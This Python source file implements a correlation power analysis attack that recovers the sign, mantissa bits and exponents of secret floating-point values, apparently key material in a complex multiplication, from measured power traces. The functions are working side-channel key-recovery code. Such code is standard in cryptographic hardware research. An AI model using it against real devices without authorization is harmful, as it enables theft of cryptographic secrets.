import numpy as np
from scipy import stats
from fpu_util import HW, fpuHW, fpuMerge, normalize53

# Candidate range for the biased exponent of the secret value (1016 to 1031 inclusive).
E_MIN, E_MAX = 1016, 1032
N_EXP = E_MAX - E_MIN

def corr(X, Y):
    """Return the Pearson correlation coefficient between X and Y."""
    return stats.pearsonr(X, Y).statistic

def attack_sign(c_split_list, traces, t_idx_start=0, t_idx_end=None):
    """
    Recover the sign bit of the secret value.

    Args:
        c_split_list (list): (s, e, m) tuples of the known inputs, as returned by fpuSplit.
        traces (array-like): Power traces of shape (N_traces, Trace_length).
        t_idx_start (int): First time index to analyze.
        t_idx_end (int): End of the time window (exclusive). Defaults to the trace length.

    Returns:
        list: [r_s, t_s], the best correlation and its time index for each sign guess (0 and 1).
    """
    N = min(len(traces), len(c_split_list))
    trace_len = len(traces[0])
    if t_idx_end is None:
        t_idx_end = trace_len
    traces = np.array(traces)[:N]

    r_s, t_s = np.zeros(2), np.zeros(2, dtype=int)
    for s in range(0, 2):
        H = [(s ^ c_split_list[i][0]) for i in range(N)]
        r_s_list = [corr(H, traces[:, t_idx]) for t_idx in range(t_idx_start, t_idx_end)]
        r_s_list = np.nan_to_num(r_s_list, nan=0.0)
        max_corr, max_idx = np.max(-1 * r_s_list), np.argmax(-1 * r_s_list) # always pick the negative ones
        r_s[s], t_s[s] = max_corr, int(max_idx + t_idx_start)
    res_s = [r_s, t_s]
    return res_s

def attack_mantissa(c_split_list, traces, highBits=6, t_idx_start=0, t_idx_end=None):
    """
    Recover the top highBits bits of the secret mantissa.

    Args:
        c_split_list (list): (s, e, m) tuples of the known inputs, as returned by fpuSplit.
        traces (array-like): Power traces of shape (N_traces, Trace_length).
        highBits (int): Number of top mantissa bits to guess.
        t_idx_start (int): First time index to analyze.
        t_idx_end (int): End of the time window (exclusive). Defaults to the trace length.

    Returns:
        list: [r_m, t_m], the best correlation and its time index for each of the 2**highBits guesses.
    """
    N = min(len(traces), len(c_split_list))
    trace_len = len(traces[0])
    if t_idx_end is None:
        t_idx_end = trace_len
    traces = np.array(traces)[:N]

    r_m, t_m = np.zeros(2**highBits), np.zeros(2**highBits, dtype=int)
    for m in range(2**highBits):
        H = [HW(normalize53(int(2**highBits + m) * int(2**52 + c_split_list[i][2])), high=True) - 1 for i in range(N)]
        r_m_list = [corr(H, traces[:, t_idx]) for t_idx in range(t_idx_start, t_idx_end)]
        r_m_list = np.nan_to_num(r_m_list, nan=0.0)
        max_corr, max_idx = np.max(np.abs(r_m_list)), np.argmax(np.abs(r_m_list))
        r_m[m], t_m[m] = max_corr, int(max_idx + t_idx_start)
    res_m = [r_m, t_m]
    return res_m

def check_mantissa(m1, m1_guess, highBits, log_error_rate=-5):
    """
    Check whether a recovered mantissa guess is close enough to the true mantissa.

    Args:
        m1 (int): The true 52-bit mantissa.
        m1_guess (int): The recovered top highBits bits of the mantissa.
        highBits (int): Number of bits in m1_guess.
        log_error_rate (float): log2 of the maximum accepted relative error.

    Returns:
        int: 1 if the relative error is below 2**log_error_rate, 0 otherwise.
    """
    rel_error = np.abs(m1 - m1_guess * 2**(52 - highBits)) / (m1 + 2**52)
    return int(rel_error < 2**log_error_rate)

def attack_exponent(c_split_list, traces, mantissa, highBits=6, t_idx_start=0, t_idx_end=None):
    """
    Recover the exponent of a single secret value, given its recovered mantissa.

    Included for completeness; attack_two_exponent attacks both exponents jointly.

    Args:
        c_split_list (list): (s, e, m) tuples of the known inputs, as returned by fpuSplit.
        traces (array-like): Power traces of shape (N_traces, Trace_length).
        mantissa (int): The recovered top highBits bits of the secret mantissa.
        highBits (int): Number of bits in mantissa.
        t_idx_start (int): First time index to analyze.
        t_idx_end (int): End of the time window (exclusive). Defaults to the trace length.

    Returns:
        list: [r_e, t_e], arrays of length 2048 indexed by the exponent guess.
        Only the entries E_MIN to E_MAX - 1 are filled.
    """
    N = min(len(traces), len(c_split_list))
    trace_len = len(traces[0])
    if t_idx_end is None:
        t_idx_end = trace_len
    traces = np.array(traces)[:N]

    r_e, t_e = np.zeros(2048), np.zeros(2048, dtype=int)
    for e in range(E_MIN, E_MAX):
        carry = [(int(2**highBits + mantissa) * int(2**52 + c_split_list[i][2]) >= int(2**(highBits+52+1))) for i in range(N)]
        H = [HW(e + c_split_list[i][1] - 1023 + carry[i]) for i in range(N)]
        r_e_list = [corr(H, traces[:, t_idx]) for t_idx in range(t_idx_start, t_idx_end)]
        r_e_list = np.nan_to_num(r_e_list, nan=0.0)
        max_corr, max_idx = np.max(np.abs(r_e_list)), np.argmax(np.abs(r_e_list))
        r_e[e], t_e[e] = max_corr, int(max_idx + t_idx_start)
    res_e = [r_e, t_e]
    return res_e

def attack_two_exponent(C_list, traces, s1, m1, s2, m2, highBits=6, t_idx_start=(0, 0), t_idx_end = None):
    """
    Jointly recover the exponents of the real (f1) and imaginary (f2) parts of a secret complex value.

    The real and imaginary products are correlated over separate time windows,
    given as (re, im) pairs in t_idx_start and t_idx_end.

    Args:
        C_list (list): Known complex inputs c = c1 + i*c2.
        traces (array-like): Power traces of shape (N_traces, Trace_length).
        s1, s2 (int): Recovered sign bits of f1 and f2.
        m1, m2 (int): Recovered top highBits bits of the mantissas of f1 and f2.
        highBits (int): Number of bits in m1 and m2.
        t_idx_start (tuple): First time index of the (real, imaginary) windows.
        t_idx_end (tuple): End of the (real, imaginary) windows (exclusive).
            Defaults to the trace length for both.

    Returns:
        list: [r_e, t_e], arrays of shape (N_EXP, N_EXP) where entry [e1 - E_MIN, e2 - E_MIN]
        holds, for the guess (e1, e2), the best correlation of the two products and the
        time index where it occurs.
    """
    N = min(len(traces), len(C_list))
    trace_len = len(traces[0])
    if t_idx_end is None:
        t_idx_end = (trace_len, trace_len)
    traces = np.array(traces)[:N]

    c1_list = [C_list[i].real for i in range(N)]
    c2_list = [C_list[i].imag for i in range(N)]

    r_e = np.zeros((N_EXP, N_EXP))
    t_e = np.zeros((N_EXP, N_EXP), dtype=int)
    for e1 in range(E_MIN, E_MAX):
        f1_cand = fpuMerge(s1, e1, int(m1 * (2**(52 - highBits))))
        for e2 in range(E_MIN, E_MAX):
            f2_cand = fpuMerge(s2, e2, int(m2 * (2**(52 - highBits))))

            # Real and imaginary parts of (f1 + i*f2) * (c1 + i*c2).
            H_re = [sum(fpuHW(f1_cand * c1_list[i] - f2_cand * c2_list[i])) for i in range(N)]
            H_im = [sum(fpuHW(f2_cand * c1_list[i] + f1_cand * c2_list[i])) for i in range(N)]
            
            r_e_re_list = [corr(H_re, traces[:, t_idx]) for t_idx in range(t_idx_start[0], t_idx_end[0])]
            r_e_re_list = np.nan_to_num(r_e_re_list, nan=0.0)
            r_e_im_list = [corr(H_im, traces[:, t_idx]) for t_idx in range(t_idx_start[1], t_idx_end[1])]
            r_e_im_list = np.nan_to_num(r_e_im_list, nan=0.0)

            max_corr_re, max_idx_re = np.max(np.abs(r_e_re_list)), np.argmax(np.abs(r_e_re_list))
            max_corr_im, max_idx_im = np.max(np.abs(r_e_im_list)), np.argmax(np.abs(r_e_im_list))
            idx = (e1 - E_MIN, e2 - E_MIN)
            if max_corr_re > max_corr_im:
                r_e[idx], t_e[idx] = max_corr_re, int(max_idx_re + t_idx_start[0])
            else:
                # r_e[idx], t_e[idx] = max_corr_re, max_idx_re + t_idx_start
                r_e[idx], t_e[idx] = max_corr_im, int(max_idx_im + t_idx_start[1])
    res_e = [r_e, t_e]
    return res_e

# Occurrence probability (in percent) of each candidate exponent from E_MIN to E_MAX - 1.
occurrence_prob = {
    1016: 0.009, 1017: 0.019, 1018: 0.038, 1019: 0.076,
    1020: 0.153, 1021: 0.307, 1022: 0.615, 1023: 1.230,
    1024: 2.457, 1025: 4.899, 1026: 9.669, 1027: 18.342,
    1028: 29.800, 1029: 27.529, 1030: 4.832, 1031: 0.007,
}